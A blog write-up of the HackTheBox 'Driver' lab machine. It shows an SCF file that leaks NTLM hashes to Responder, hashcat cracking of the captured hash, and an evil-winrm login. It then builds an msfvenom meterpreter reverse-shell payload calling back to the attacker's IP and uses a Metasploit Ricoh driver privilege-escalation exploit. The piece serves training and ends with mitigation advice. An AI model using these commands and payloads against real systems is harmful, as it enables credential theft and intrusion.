---
title: "HackTheBox - Driver"
author: Nasrallah
description: ""
date: 2023-07-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, cve, responder, crack, hashcat, metasploit, smb]
img_path: /assets/img/hackthebox/machines/driver
image:
    path: driver.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Driver](https://www.hackthebox.com/machines/driver) from [HackTheBox](https://www.hackthebox.com) has an upload page that saves the files to a file share, we upload a scf file that triggers when someone looks at it in Explorer. We capture a hash in Responder and crack it to gain a foothold. On the machine we find a printer vulnerable to local privesc, so we exploit it to get system.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.106
Host is up (0.12s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m04s, deviation: 0s, median: 7h00m04s
| smb2-time: 
|   date: 2023-11-13T18:03:34
|_  start_date: 2023-11-13T16:46:57
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

We found a web server on port 80 and SMB.

### Web

Let's navigate to the web page.

![basic auth](1.png)

We got a basic authentication.

Trying `admin:admin` works.

![web page](2.png)

The website is a MFP Firmware Update Center.

We got multiple tabs but the one that works is `Firmware Updates` which goes to `http://driver.htb/fw_up.php`.

![update page](3.png)

Here we can upload a firmware update to a file share.

I searched on google for `SMB file upload exploit` and found this [article](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/).

We can upload a SCF (Shell Command File) like the following:

```shell
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

When a user browses to the share where this file is located, a connection will be established automatically from his system to our listener which is `Responder`.

## **Foothold**

We first start `Responder`.

```shell
sudo responder -I tun0
```

Now edit the file by adding your tun0 IP address and upload it.

We wait a little bit and should get the NTLMV2 hash.

![hash](4.png)

Now let's crack the hash using `hashcat`:

```shell
hashcat john.hash rockyou.txt


Minimum password length supported by kernel: 0                                                                                                                                                                                                
Maximum password length supported by kernel: 256                                                                                                                                                                                              
                                                                                                                                                                                                                                              
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                                                                                           
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                                                                                  
Rules: 1                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                              
Optimizers applied:                                                                                                                                                                                                                           
* Zero-Byte                                                                                                                                                                                                                                   
* Not-Iterated                                                                                                                                                                                                                                
* Single-Hash                                                                                                                                                                                                                                 
* Single-Salt                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                              
ATTENTION! Pure (unoptimized) backend kernels selected.                                                                                                                                                                                       
Pure kernels can crack longer passwords, but drastically reduce performance.                                                                                                                                                                  
If you want to switch to optimized kernels, append -O to your commandline.                                                                                                                                                                    
See the above message to find out about the exact limits.                                                                                                                                                                                     
                                                                                                                                                                                                                                              
Watchdog: Hardware monitoring interface not found on your system.                                                                                                                                                                             
Watchdog: Temperature abort trigger disabled.                                                                                                                                                                                                 
                                                                                                                                                                                                                                              
Host memory required for this attack: 1335 MB                                                                                                                                                                                                 
                                                                                                                                                                                                                                              
Dictionary cache hit:                                                                                                                                                                                                                         
* Filename..: rockyou.txt                                                                                                                                                                                                                     
* Passwords.: 14344384                                                                                                                                                                                                                        
* Bytes.....: 139921497                                                                                                                                                                                                                       
* Keyspace..: 14344384                                                                                                                                                                                                                        
                                                                                                                                                                                                                                              
TONY::DRIVER:2b27e274bd76d58a:47494bed881df9aa73018cbe9d08826f:010100000000000080b8629eaa17da01af08a335675d48550000000002000800580032003200410001001e00570049004e002d0053004100550052004c00410045004f0038005600590004003400570049004e002d00530
04100550052004c00410045004f003800560059002e0058003200320041002e004c004f00430041004c000300140058003200320041002e004c004f00430041004c000500140058003200320041002e004c004f00430041004c000700080080b8629eaa17da01060004000200000008003000300000000
00000000000000000200000c1c6a3ebbf8ebcbc22aecf7621afba2243ac10f1cc64d8324da61e3a34c9fd7c0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310037002e0039003000000000000000000000000000:liltony       
                                                                                                                                                                                                                                              
Session..........: hashcat                                                                                                                                                                                                                    
Status...........: Cracked                                                                                                                                                                                                                    
Hash.Mode........: 5600 (NetNTLMv2)                                                                                                                                                                                                           
Hash.Target......: TONY::DRIVER:2b27e274bd76d58a:47494bed881df9aa73018...000000                                                                                                                                                               
Time.Started.....: Wed Nov 15 11:02:51 2023 (1 sec)                                                                                                                                                                                           
Time.Estimated...: Wed Nov 15 11:02:52 2023 (0 secs)                                                                                                                                                                                          
Kernel.Feature...: Pure Kernel                                                                                                                                                                                                                
Guess.Base.......: File (rockyou.txt)                                                                                                                                                                                                         
Guess.Queue......: 1/1 (100.00%)                                                                                                                                                                                                              
Speed.#1.........:  6249.7 kH/s (11.31ms) @ Accel:16 Loops:1 Thr:64 Vec:1                                                                                                                                                                     
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                                                                                                                                                 
Progress.........: 98304/14344384 (0.69%)                                                                                                                                                                                                     
Rejected.........: 0/98304 (0.00%)                                                                                                                                                                                                            
Restore.Point....: 0/14344384 (0.00%)                                                                                                                                                                                                         
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                                                                                                                                                                                         
Candidate.Engine.: Device Generator                                                                                                                                                                                                           
Candidates.#1....: 123456 -> Dominic1                                                                                                                                                
```

Let's use `crackmapexec` and see what we can find.

![crackmapexe](5.png)

We've successfully authenticated to SMB but we don't have any permission over the shares.

Next thing is `winrm` and `crackmapexec` showed us `Pwned` which means we can login via `winrm` and get a shell.

```shell
$ evil-winrm -i driver.htb -u tony -p liltony
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tony\Documents> 
```

Great! We got a shell.

## **Privilege Escalation**

Checking powershell history file we find the following:

```shell
*Evil-WinRM* PS C:\Users\tony\appdata\roaming\microsoft\windows\powershell\psreadline> cat ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'

ping 1.1.1.1
ping 1.1.1.1

```

It seems that the user added a printer with the name `RICOH_PCL6`, searching for this printer reveals it's vulnerable to a local privilege escalation.

The exploit is the metasploit module `exploit/windows/local/ricoh_driver_privesc`.

Let's first get a `Meterpreter` session.

We generate a reverse shell with `msfvenom`:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.90 LPORT=9001 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe
```

Upload the exe file to the target using `evil-winrm`.

```shell
*Evil-WinRM* PS C:\Users\tony\downloads> upload /home/parrot/CTF/HTB/Machines/driver/rev.exe
                                        
Info: Uploading /home/parrot/CTF/HTB/Machines/driver/rev.exe to C:\Users\tony\downloads\rev.exe
                                        
Data: 9556 bytes of 9556 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\tony\downloads>
```

Setup a handler on `metasploit`.

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost tun0
lhost => tun0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 9001
lport => 9001
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.17.90:9001
```

Now back to `evil-winrm` we run the file `.\rev.exe`

```shell
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 10.10.17.90:9001 
[*] Sending stage (200774 bytes) to 10.10.11.106
[*] Meterpreter session 1 opened (10.10.17.90:9001 -> 10.10.11.106:49445) at 2023-11-15 10:33:52 +0000

(Meterpreter 1)(C:\Users\tony\downloads) > 
```

We got the `meterpreter` session.

Now we migrate to a more stable process like `explorer.exe`.

![migrate](6.png)

Now we background the session with `background`, use the `exploit/windows/local/ricoh_driver_privesc` module and set the session and `LHOST` to tun0 and run the exploit.

![privest](7.png)

We got system!

## **Prevention and Mitigation**

### Password

The web page was protected with a basic authentication but the credentials "`admin:admin`" were easy to guess which allowed us to access the page.

### File upload

The note on the upload page reveals that the uploaded file are saved in a file share, this attack could have been prevented if the uploaded file were saved in a much safer place rather than an SMB share, and the use of Kerberos Authentication and SMB Signing.

The hash retrieved was easy to crack because the password is weak. Enforce complex password policy(Long passwords with numbers and special characters), the passwords also should be changed frequently.

### CVE-2019-19363

The printer is vulnerable to local privilege escalation, it should be updated to a newer version.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

## **References**

<https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/>
